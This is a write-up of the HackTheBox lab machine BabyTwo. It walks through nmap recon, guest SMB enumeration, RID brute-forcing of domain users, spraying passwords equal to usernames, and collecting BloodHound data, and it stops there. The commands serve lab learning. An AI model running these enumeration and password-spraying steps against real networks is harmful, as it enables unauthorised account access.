---
title: BabyTwo
date: 2026-04-26
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - Port53-DNS-Discovery-Host
  - Nmap-analyzing
  - Port139-135-SMB-enumerating-spider
  - Source-Code-Review-lnk
  - Port139-135-SMB-rid-brute
  - Port139-135-SMB-BurteForce
  - Lateral-Movement-Account-Verify-Nxc
  - Bloodhound-Setup-Docker-x86
  - Bloodhound-Vectory-View-All-User
  - Bloodhound-vectory-loginscript
  - Bloodhound-vectory-WriteOwner-WriteDacl
  - Bloodhound-vectory-GenericAll-Group
  - windows
lastmod: 2026-05-08T05:48:57.176Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/BabyTwo" >}}

***

# Recon

### PORT & IP SCAN

{{< toggle "Tag 🏷️" >}}

{{< tag "Nmap-analyzing" >}} The target (10.129.234.72) is a Windows Domain Controller for the domain baby2.vl (hostname: dc.baby2.vl). It has a typical full AD exposure with the following ports open: 53 (DNS), 88 (Kerberos), 135/593/52855 (RPC), 139/445 (NetBIOS/SMB), 389/636/3268/3269 (LDAP/LDAPS + Global Catalog), 464 (Kerberos password change), 3389 (RDP), 9389 (.NET Message Framing), and multiple high dynamic RPC ports (49664, 49668, etc.). The system is running Windows Server 2022 (build 10.0.20348) with Active Directory services fully accessible.

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 10.129.234.72  -oN serviceScan.txt 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-29 22:10 +0800
Nmap scan report for 10.129.234.72
Host is up (0.071s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-29 14:10:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc.baby2.vl
| Not valid before: 2026-04-28T13:51:31
|_Not valid after:  2026-10-28T13:51:31
| rdp-ntlm-info: 
|   Target_Name: BABY2
|   NetBIOS_Domain_Name: BABY2
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: baby2.vl
|   DNS_Computer_Name: dc.baby2.vl
|   DNS_Tree_Name: baby2.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-04-29T14:11:10+00:00
|_ssl-date: 2026-04-29T14:11:50+00:00; +1s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
52855/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
52856/tcp open  msrpc         Microsoft Windows RPC
52874/tcp open  msrpc         Microsoft Windows RPC
59992/tcp open  msrpc         Microsoft Windows RPC
60028/tcp open  msrpc         Microsoft Windows RPC
64459/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-29T14:11:12
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.95 seconds
```

### DNS

{{< toggle "Tag 🏷️" >}}

{{< tag "Port53-DNS-Discovery-Host" >}} I’ll use netexec to make a hosts file entry and put it at the top of my `/etc/hosts` file:

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# nxc smb 10.129.234.72  --generate-hosts-file  hosts

SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False) 
```

I’ll use `netexec` to make a `hosts` file entry and put it at the top of my `/etc/hosts` file:

{{< code >}}\
127.0.0.1       localhost\
127.0.1.1       kali\
::1             localhost ip6-localhost ip6-loopback\
ff02::1         ip6-allnodes\
ff02::2         ip6-allrouters\
10.129.234.72   DC.baby2.vl baby2.vl DC\
{{< /code >}}

### SMB

{{< toggle "Tag 🏷️" >}}

{{< tag "Port139-135-SMB-enumerating-spider" >}} I’ll look for files on each share with the `spider_plus` module for `netexec`:

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# nxc smb DC.baby2.vl  -u 'guest' -p '' -M spider_plus
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.72   445    DC               [+] baby2.vl\guest: 
SPIDER_PLUS 10.129.234.72   445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.234.72   445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.234.72   445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.234.72   445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.234.72   445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.234.72   445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.234.72   445    DC               [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus
SMB         10.129.234.72   445    DC               [*] Enumerated shares
SMB         10.129.234.72   445    DC               Share           Permissions     Remark
SMB         10.129.234.72   445    DC               -----           -----------     ------
SMB         10.129.234.72   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.72   445    DC               apps            READ            
SMB         10.129.234.72   445    DC               C$                              Default share
SMB         10.129.234.72   445    DC               docs                            
SMB         10.129.234.72   445    DC               homes           READ,WRITE      
SMB         10.129.234.72   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.72   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.72   445    DC               SYSVOL                          Logon server share 
SPIDER_PLUS 10.129.234.72   445    DC               [+] Saved share-file metadata to "/root/.nxc/modules/nxc_spider_plus/10.129.234.72.json".
SPIDER_PLUS 10.129.234.72   445    DC               [*] SMB Shares:           8 (ADMIN$, apps, C$, docs, homes, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.129.234.72   445    DC               [*] SMB Readable Shares:  4 (apps, homes, IPC$, NETLOGON)
SPIDER_PLUS 10.129.234.72   445    DC               [*] SMB Writable Shares:  1 (homes)
SPIDER_PLUS 10.129.234.72   445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.234.72   445    DC               [*] Total folders found:  12
SPIDER_PLUS 10.129.234.72   445    DC               [*] Total files found:    3
SPIDER_PLUS 10.129.234.72   445    DC               [*] File size average:    966.67 B
SPIDER_PLUS 10.129.234.72   445    DC               [*] File size min:        108 B
SPIDER_PLUS 10.129.234.72   445    DC               [*] File size max:        1.76 KB

```

```
┌──(root㉿kali)-[~/Desktop]
└─# cat /root/.nxc/modules/nxc_spider_plus/10.129.234.72.json 
{
    "NETLOGON": {
        "login.vbs": {
            "atime_epoch": "2025-08-25 07:23:29",
            "ctime_epoch": "2025-08-25 04:30:24",
            "mtime_epoch": "2025-08-25 07:23:29",
            "size": "992 B"
        }
    },
    "apps": {
        "dev/CHANGELOG": {
            "atime_epoch": "2023-09-07 15:16:15",
            "ctime_epoch": "2023-09-07 15:13:40",
            "mtime_epoch": "2023-09-07 15:20:13",
            "size": "108 B"
        },
        "dev/login.vbs.lnk": {
            "atime_epoch": "2023-09-07 15:13:23",
            "ctime_epoch": "2023-09-07 15:13:04",
            "mtime_epoch": "2023-09-07 15:20:13",
            "size": "1.76 KB"
        }
    },
    "homes": {}
```

I’ll use `smbclient` to get each of these. `CHANGELOG` has some notes about a tool:

```
┌──(root㉿kali)-[~/Desktop]
└─# smbclient //10.129.234.72/apps -N 
Try "help" to get a list of possible commands.
smb: \> cd dev
smb: \dev\> get CHANGELOG
getting file \dev\CHANGELOG of size 108 as CHANGELOG (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \dev\> 
smb: \dev\> get login.vbs.lnk
getting file \dev\login.vbs.lnk of size 1800 as login.vbs.lnk (2.2 KiloBytes/sec) (average 1.3 KiloBytes/sec)
smb: \dev\> 

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Source-Code-Review-lnk" >}} I’ll use lnkparse3 (uv tool install lnkparse3) to see details on the lnk file,It links to `login.vbs` in `C:\Windows\SYSVOL\sysvol\baby2.vl\scripts`. `login.vbs` maps the `apps` and `docs` shares as the `V:` and `L:` drivers on a users machine.

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# cat login.vbs.lnk
L�F ��.��dy=����dy=�����9P�O� �:i�+00�/C:\V1��Windows@  ﾨR�@��.▒4jWindowsT1W��SYSVOL>   ��W��W��.#� I�SYSVOLT1W��sysvol>    ��W��W��.d���sysvolZ1W��baby2.vlB       ��W��W��.e����baby2.vl▒V1W��scripts@    ��W��W��._�M=scripts\2�"W�v login.vbsD      ��W��"W�v.����login.vbs▒�-Xz�$��C:\Windows\SYSVOL\sysvol\baby2.vl\scripts\"\\DC\NETLOGONlogin.vbs9..\..\..\Windows\SYSVOL\sysvol\baby2.vl\scripts\login.vbs)C:\Windows\SYSVOL\sysvol\baby2.vl\scripts�$�
                                                                                                    ����C�B�g�
                                                                                                              (�#�`�Xdc�)1����B���s��a~Md�A��
                         )��%�)1����B���s��a~Md�A��
                                                   )��%�        ��1SPS�0��C�G����sf"id,scripts (C:\Windows\SYSVOL\sysvol\baby2.vl)�1SPS��XF�L8C���&�m�m-S-1-5-21-213243958-1766259620-4276976267-500�1SPS0�%��G▒��`����%

login.vbs@���.��
                �=VBScript Script File@dy=�����1SPS�jc(=�����O�▒�y4C:\Windows\SYSVOL\sysvol\baby2.vl\scripts\login.vbs91SPS�mD��pH�H@.�=x�hH\���)�K���b� V�   
```

I’ll use lnkparse3 (uv tool install lnkparse3) to see details on the lnk file:

```
┌──(root㉿kali)-[~/Desktop]
└─# uv tool install lnkparse3
Resolved 2 packages in 960ms
Prepared 2 packages in 542ms
Installed 2 packages in 130ms
 + lnkparse3==1.6.0
 + pyyaml==6.0.3
Installed 1 executable: lnkparse
warning: `/root/.local/bin` is not on your PATH. To use installed tools, run `export PATH="/root/.local/bin:$PATH"` or `uv tool update-shell`.

```

```
┌──(root㉿kali)-[~/Desktop]
└─# lnkparse login.vbs.lnk
Windows Shortcut Information:
   Guid: 00021401-0000-0000-C000-000000000046
   Link flags: HasTargetIDList | HasLinkInfo | HasRelativePath | HasWorkingDir | IsUnicode | EnableTargetMetadata - (524443)
   File flags: FILE_ATTRIBUTE_ARCHIVE - (32)
   Creation time: 2023-08-22 19:28:18.552829+00:00
   Accessed time: 2023-09-02 14:55:51.994608+00:00
   Modified time: 2023-09-02 14:55:51.994608+00:00
   File size: 992
   Icon index: 0
   Windowstyle: SW_SHOWNORMAL
   Hotkey: UNSET - UNSET {0x0000}

   SIZE: 1800

   TARGET:
      Items:
      -  Root Folder:
            Sort index: My Computer
            Sort index value: 80
            Guid: 20D04FE0-3AEA-1069-A2D8-08002B30309D
      -  Volume Item:
            Flags: '0xf'
            Volume name: C:\
      -  File entry:
            Flags: Is directory
            File size: 0
            File attribute flags: 16
            Primary name: Windows
      -  File entry:
            Flags: Is directory
            File size: 0
            File attribute flags: 16
            Primary name: SYSVOL
      -  File entry:
            Flags: Is directory
            File size: 0
            File attribute flags: 16
            Primary name: sysvol
      -  File entry:
            Flags: Is directory
            File size: 0
            File attribute flags: 1040
            Primary name: baby2.vl
      -  File entry:
            Flags: Is directory
            File size: 0
            File attribute flags: 16
            Primary name: scripts
      -  File entry:
            Flags: Is file
            File size: 992
            File attribute flags: 32
            Primary name: login.vbs

   LINK INFO:
      Link info flags: 3
      Local base path: C:\Windows\SYSVOL\sysvol\baby2.vl\scripts\
      Common path suffix: login.vbs
      Location info:
         Drive type: DRIVE_FIXED
         Drive serial number: '0xe6f32485'
         Volume label: ''
      Location: Local

   DATA:
      Relative path: ..\..\..\Windows\SYSVOL\sysvol\baby2.vl\scripts\login.vbs
      Working directory: C:\Windows\SYSVOL\sysvol\baby2.vl\scripts

   EXTRA:
      SPECIAL FOLDER LOCATION BLOCK:
         Size: 16
         Special folder id: 36
         Offset: 131
      KNOWN FOLDER LOCATION BLOCK:
         Size: 28
         Known folder id: F38BF404-1D43-42F2-9305-67DE0B28FC23
         Offset: 131
      DISTRIBUTED LINK TRACKER BLOCK:
         Size: 96
         Length: 88
         Version: 0
         Machine identifier: dc
         Droid volume identifier: F73129F6-BEED-429A-88BA-9573971C9D61
         Droid file identifier: A6644D7E-411F-11EE-B012-000C29AF9E25
         Birth droid volume identifier: F73129F6-BEED-429A-88BA-9573971C9D61
         Birth droid file identifier: A6644D7E-411F-11EE-B012-000C29AF9E25
      METADATA PROPERTIES BLOCK:
         Size: 677
         Property store:
         -  Storage size: 133
            Version: '0x53505331'
            Format id: DABD30ED-0043-4789-A7F8-D013A4736622
            Serialized property values:
            -  Value size: 105
               Id: 100
               Value: scripts (C:\Windows\SYSVOL\sysvol\baby2.vl)
               Value type: VT_LPWSTR
         -  Storage size: 137
            Version: '0x53505331'
            Format id: 46588AE2-4CBC-4338-BBFC-139326986DCE
            Serialized property values:
            -  Value size: 109
               Id: 4
               Value: S-1-5-21-213243958-1766259620-4276976267-500
               Value type: VT_LPWSTR
         -  Storage size: 189
            Version: '0x53505331'
            Format id: B725F130-47EF-101A-A5F1-02608C9EEBAC
            Serialized property values:
            -  Value size: 37
               Id: 10
               Value: login.vbs
               Value type: VT_LPWSTR
            -  Value size: 21
               Id: 15
               Value: null
               Value type: VT_FILETIME
            -  Value size: 21
               Id: 12
               Value: null
               Value type: VT_UI8
            -  Value size: 61
               Id: 4
               Value: VBScript Script File
               Value type: VT_LPWSTR
            -  Value size: 21
               Id: 14
               Value: null
               Value type: VT_FILETIME
         -  Storage size: 149
            Version: '0x53505331'
            Format id: 28636AA6-953D-11D2-B5D6-00C04FD918D0
            Serialized property values:
            -  Value size: 121
               Id: 30
               Value: C:\Windows\SYSVOL\sysvol\baby2.vl\scripts\login.vbs
               Value type: VT_LPWSTR
         -  Storage size: 57
            Version: '0x53505331'
            Format id: 446D16B1-8DAD-4870-A748-402EA43D788C
            Serialized property values:
            -  Value size: 29
               Id: 104
               Value: null
               Value type: VT_CLSID
```

This artifact suggests that an entity logged in as the Domain Administrator on the Domain Controller (`dc`) interacted with a shortcut pointing to a VBScript logon script (`login.vbs`) within the domain's `SYSVOL` share. If this is from a compromised machine, it strongly suggests the attacker achieved Domain Admin privileges and used logon scripts for lateral movement or persistence.

```
┌──(root㉿kali)-[~/Desktop]
└─# smbclient //10.129.234.72/NETLOGON  -N 
Try "help" to get a list of possible commands.
smb: \> get login.vbs
getting file \login.vbs of size 992 as login.vbs (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)
smb: \> 

```

{{< code >}}\
Sub MapNetworkShare(sharePath, driveLetter)\
Dim objNetwork\
Set objNetwork = CreateObject("WScript.Network")

```
' Check if the drive is already mapped
Dim mappedDrives
Set mappedDrives = objNetwork.EnumNetworkDrives
Dim isMapped
isMapped = False
For i = 0 To mappedDrives.Count - 1 Step 2
    If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then
        isMapped = True
        Exit For
    End If
Next

If isMapped Then
    objNetwork.RemoveNetworkDrive driveLetter & ":", True, True
End If

objNetwork.MapNetworkDrive driveLetter & ":", sharePath

If Err.Number = 0 Then
    WScript.Echo "Mapped " & driveLetter & ": to " & sharePath
Else
    WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description
End If

Set objNetwork = Nothing
```

End Sub

MapNetworkShare "\dc.baby2.vl\apps", "V"\
MapNetworkShare "\dc.baby2.vl\docs", "L"\
{{< /code >}}

On its own, **this specific snippet is entirely benign.** There are no reverse shells, credential dumpers, or explicit malicious payloads here. This is exactly what a legitimate corporate logon script looks like.

### Users

{{< toggle "Tag 🏷️" >}}

{{< tag "Port139-135-SMB-rid-brute" >}} This includes all the users with home directories, and more. I’ll use this to make a users list:

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# nxc smb DC.baby2.vl  -u 'guest' -p '' --rid-brute         
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.72   445    DC               [+] baby2.vl\guest: 
SMB         10.129.234.72   445    DC               498: BABY2\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.72   445    DC               500: BABY2\Administrator (SidTypeUser)
SMB         10.129.234.72   445    DC               501: BABY2\Guest (SidTypeUser)
SMB         10.129.234.72   445    DC               502: BABY2\krbtgt (SidTypeUser)
SMB         10.129.234.72   445    DC               512: BABY2\Domain Admins (SidTypeGroup)
SMB         10.129.234.72   445    DC               513: BABY2\Domain Users (SidTypeGroup)
SMB         10.129.234.72   445    DC               514: BABY2\Domain Guests (SidTypeGroup)
SMB         10.129.234.72   445    DC               515: BABY2\Domain Computers (SidTypeGroup)
SMB         10.129.234.72   445    DC               516: BABY2\Domain Controllers (SidTypeGroup)
SMB         10.129.234.72   445    DC               517: BABY2\Cert Publishers (SidTypeAlias)
SMB         10.129.234.72   445    DC               518: BABY2\Schema Admins (SidTypeGroup)
SMB         10.129.234.72   445    DC               519: BABY2\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.72   445    DC               520: BABY2\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.72   445    DC               521: BABY2\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.72   445    DC               522: BABY2\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.72   445    DC               525: BABY2\Protected Users (SidTypeGroup)
SMB         10.129.234.72   445    DC               526: BABY2\Key Admins (SidTypeGroup)
SMB         10.129.234.72   445    DC               527: BABY2\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.72   445    DC               553: BABY2\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.72   445    DC               571: BABY2\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.72   445    DC               572: BABY2\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.72   445    DC               1000: BABY2\DC$ (SidTypeUser)
SMB         10.129.234.72   445    DC               1101: BABY2\DnsAdmins (SidTypeAlias)
SMB         10.129.234.72   445    DC               1102: BABY2\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.72   445    DC               1103: BABY2\gpoadm (SidTypeUser)
SMB         10.129.234.72   445    DC               1104: BABY2\office (SidTypeGroup)
SMB         10.129.234.72   445    DC               1105: BABY2\Joan.Jennings (SidTypeUser)
SMB         10.129.234.72   445    DC               1106: BABY2\Mohammed.Harris (SidTypeUser)
SMB         10.129.234.72   445    DC               1107: BABY2\Harry.Shaw (SidTypeUser)
SMB         10.129.234.72   445    DC               1108: BABY2\Carl.Moore (SidTypeUser)
SMB         10.129.234.72   445    DC               1109: BABY2\Ryan.Jenkins (SidTypeUser)
SMB         10.129.234.72   445    DC               1110: BABY2\Kieran.Mitchell (SidTypeUser)
SMB         10.129.234.72   445    DC               1111: BABY2\Nicola.Lamb (SidTypeUser)
SMB         10.129.234.72   445    DC               1112: BABY2\Lynda.Bailey (SidTypeUser)
SMB         10.129.234.72   445    DC               1113: BABY2\Joel.Hurst (SidTypeUser)
SMB         10.129.234.72   445    DC               1114: BABY2\Amelia.Griffiths (SidTypeUser)
SMB         10.129.234.72   445    DC               1602: BABY2\library (SidTypeUser)
SMB         10.129.234.72   445    DC               2601: BABY2\legacy (SidTypeGroup)

```

```
┌──(root㉿kali)-[~/Desktop]
└─# cat tmp.txt |  awk -F '\' '{print $2}' | awk -F "(" '{print $1}'  | sed 's/ //g' > username.txt  && cat username.txt

guest:
EnterpriseRead-onlyDomainControllers
Administrator
Guest
krbtgt
DomainAdmins
DomainUsers
DomainGuests
DomainComputers
DomainControllers
CertPublishers
SchemaAdmins
EnterpriseAdmins
GroupPolicyCreatorOwners
Read-onlyDomainControllers
CloneableDomainControllers
ProtectedUsers
KeyAdmins
EnterpriseKeyAdmins
RASandIASServers
AllowedRODCPasswordReplicationGroup
DeniedRODCPasswordReplicationGroup
DC$
DnsAdmins
DnsUpdateProxy
gpoadm
office
Joan.Jennings
Mohammed.Harris
Harry.Shaw
Carl.Moore
Ryan.Jenkins
Kieran.Mitchell
Nicola.Lamb
Lynda.Bailey
Joel.Hurst
Amelia.Griffiths
library
legacy

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Port139-135-SMB-BurteForce" >}} Vulnlabs really likes to showcase password attacks on Windows boxes. One of these is checking for users with their password being their username:

{{< /toggle >}}

```shell
┌──(root㉿kali)-[~/Desktop]
└─# netexec smb DC.baby2.vl  -u username.txt  -p username.txt --continue-on-success   --no-bruteforce | grep '[+]'
SMB                      10.129.234.72   445    DC               [+] baby2.vl\: 
SMB                      10.129.234.72   445    DC               [+] baby2.vl\guest::guest: (Guest)
SMB                      10.129.234.72   445    DC               [+] baby2.vl\EnterpriseRead-onlyDomainControllers:EnterpriseRead-onlyDomainControllers (Guest)
SMB                      10.129.234.72   445    DC               [+] baby2.vl\DomainAdmins:DomainAdmins (Guest)
SMB                      10.129.234.72   445    DC               [+] baby2.vl\DomainUsers:DomainUsers (Guest)
SMB                      10.129.234.72   445    DC               [+] baby2.vl\DomainGuests:DomainGuests (Guest)
SMB                      10.129.234.72   445    DC               [+] baby2.vl\DomainComputers:DomainComputers (Guest)
SMB                      10.129.234.72   445    DC               [+] baby2.vl\DomainControllers:DomainControllers (Guest)
SMB                      10.129.234.72   445    DC               [+] baby2.vl\CertPublishers:CertPublishers (Guest)
SMB                      10.129.234.72   445    DC               [+] baby2.vl\SchemaAdmins:SchemaAdmins (Guest)
SMB                      10.129.234.72   445    DC               [+] baby2.vl\EnterpriseAdmins:EnterpriseAdmins (Guest)
SMB                      10.129.234.72   445    DC               [+] baby2.vl\GroupPolicyCreatorOwners:GroupPolicyCreatorOwners (Guest)
SMB                      10.129.234.72   445    DC               [+] baby2.vl\Read-onlyDomainControllers:Read-onlyDomainControllers (Guest)
SMB                      10.129.234.72   445    DC               [+] baby2.vl\CloneableDomainControllers:CloneableDomainControllers (Guest)
SMB                      10.129.234.72   445    DC               [+] baby2.vl\ProtectedUsers:ProtectedUsers (Guest)
SMB                      10.129.234.72   445    DC               [+] baby2.vl\KeyAdmins:KeyAdmins (Guest)
SMB                      10.129.234.72   445    DC               [+] baby2.vl\EnterpriseKeyAdmins:EnterpriseKeyAdmins (Guest)
SMB                      10.129.234.72   445    DC               [+] baby2.vl\RASandIASServers:RASandIASServers (Guest)
SMB                      10.129.234.72   445    DC               [+] baby2.vl\AllowedRODCPasswordReplicationGroup:AllowedRODCPasswordReplicationGroup (Guest)
SMB                      10.129.234.72   445    DC               [+] baby2.vl\DeniedRODCPasswordReplicationGroup:DeniedRODCPasswordReplicationGroup (Guest)
SMB                      10.129.234.72   445    DC               [+] baby2.vl\DnsAdmins:DnsAdmins (Guest)
SMB                      10.129.234.72   445    DC               [+] baby2.vl\DnsUpdateProxy:DnsUpdateProxy (Guest)
SMB                      10.129.234.72   445    DC               [+] baby2.vl\office:office (Guest)
SMB                      10.129.234.72   445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore 
SMB                      10.129.234.72   445    DC               [+] baby2.vl\library:library 
SMB                      10.129.234.72   445    DC               [+] baby2.vl\legacy:legacy (Guest)
SMB                      10.129.234.72   445    DC               [+] baby2.vl\: 

```

library:library  and Carl.Moore:Carl.Moore  is ok

Only the Pwn! is ok to login

{{< toggle "Tag 🏷️" >}}

{{< tag "Lateral-Movement-Account-Verify-Nxc" >}} For the winrm , wmi , rdp , need to have the flag of Pwned! which mean to allow to login ; otherwise , it is false positive, but the idap and smb is also normal work.

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─#  for proto in smb winrm wmi rdp ssh ldap mssql ftp; do echo -e "\n[*] Testing $proto..." && netexec $proto DC.baby2.vl  -u 'library' -p 'library'; done      

[*] Testing smb...
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.72   445    DC               [+] baby2.vl\library:library 

[*] Testing winrm...
WINRM       10.129.234.72   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:baby2.vl)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.234.72   5985   DC               [-] baby2.vl\library:library

[*] Testing wmi...
RPC         10.129.234.72   135    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:baby2.vl)
RPC         10.129.234.72   135    DC               [+] baby2.vl\library:library 

[*] Testing rdp...
RDP         10.129.234.72   3389   DC               [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC) (domain:baby2.vl) (nla:True)
RDP         10.129.234.72   3389   DC               [+] baby2.vl\library:library 

[*] Testing ssh...

[*] Testing ldap...
LDAP        10.129.234.72   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:baby2.vl)
LDAP        10.129.234.72   389    DC               [+] baby2.vl\library:library 

```

```
┌──(root㉿kali)-[~/Desktop]
└─#  for proto in smb winrm wmi rdp ssh ldap mssql ftp; do echo -e "\n[*] Testing $proto..." && netexec $proto DC.baby2.vl  -u 'Carl.Moore' -p 'Carl.Moore'; done

[*] Testing smb...
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.72   445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore 

[*] Testing winrm...
WINRM       10.129.234.72   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:baby2.vl)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.234.72   5985   DC               [-] baby2.vl\Carl.Moore:Carl.Moore

[*] Testing wmi...
RPC         10.129.234.72   135    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:baby2.vl)
RPC         10.129.234.72   135    DC               [+] baby2.vl\Carl.Moore:Carl.Moore 

[*] Testing rdp...
RDP         10.129.234.72   3389   DC               [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC) (domain:baby2.vl) (nla:True)
RDP         10.129.234.72   3389   DC               [+] baby2.vl\Carl.Moore:Carl.Moore 

[*] Testing ssh...

[*] Testing ldap...
LDAP        10.129.234.72   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:baby2.vl)
LDAP        10.129.234.72   389    DC               [+] baby2.vl\Carl.Moore:Carl.Moore 


```

```
netexec ldap dc1.delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' --bloodhound -c All --dns-server 10.129.234.69
```

```
┌──(root㉿kali)-[~/Desktop]
└─# netexec ldap DC.baby2.vl  -u Carl.Moore  -p 'Carl.Moore' --bloodhound -c All --dns-server 10.129.234.72
LDAP        10.129.234.72   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:baby2.vl)
LDAP        10.129.234.72   389    DC               [+] baby2.vl\Carl.Moore:Carl.Moore 
LDAP        10.129.234.72   389    DC               Resolved collection methods: trusts, psremote, container, acl, dcom, session, objectprops, rdp, group, localadmin
[23:30:02] ERROR    Unhandled exception in computer dc.baby2.vl processing: The NETBIOS connection with the remote host timed out.                                                                                          computers.py:268
LDAP        10.129.234.72   389    DC               Done in 00M 29S
